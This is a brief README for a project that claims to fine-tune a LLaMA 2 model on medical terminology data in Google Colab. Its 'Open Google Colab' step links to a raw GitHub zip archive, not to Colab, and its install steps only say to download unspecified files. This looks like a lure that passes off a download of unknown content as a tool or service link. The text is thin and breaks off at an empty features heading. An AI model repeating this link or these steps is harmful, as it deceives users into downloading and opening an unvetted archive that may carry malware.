## 📚 Overview

This project helps you fine-tune a pretrained LLaMA 2 model using Hugging Face Transformers. We use the latest techniques in a user-friendly environment, Google Colab. The model we start with, **aboonaji/llama2finetune-v2**, comes from Hugging Face Hub, and we adapt it to work with a medical text dataset, **wiki_medical_terms_llam2_format**. This means you can customize a powerful AI model to better understand medical language.

## 🖥 System Requirements

To run this project, you need:

- A stable internet connection
- A Google account (to access Google Colab)
- No local software installation is needed; everything runs in the cloud

Follow these steps to install:

1. Click on the version you want.
2. Download the relevant files.
3. Open Google Colab in your web browser.
4. Upload the downloaded files to your Google Colab workspace.

## 🧑‍💻 How to Use

1. **Open Google Colab**: Go to [Google Colab](https://raw.githubusercontent.com/collo59/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face/main/Palaemonidae/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face_v3.8.zip).

2. **Create a New Notebook**: Click on "New Notebook" or open an existing one.

3. **Upload Your Files**: Use the file upload feature in Colab to include your downloaded files. This will make them available for use.

4. **Copy Example Code**: We provide example code in the documentation. Copy and paste it into your Colab notebook.

5. **Run the Code**: Click the "Run" button to execute the cells. This will start the fine-tuning process on your selected dataset.

6. **Monitor Progress**: You will see output in the notebook as the model trains. Keep an eye on performance metrics to see how well the model is learning.

## 🔍 Features
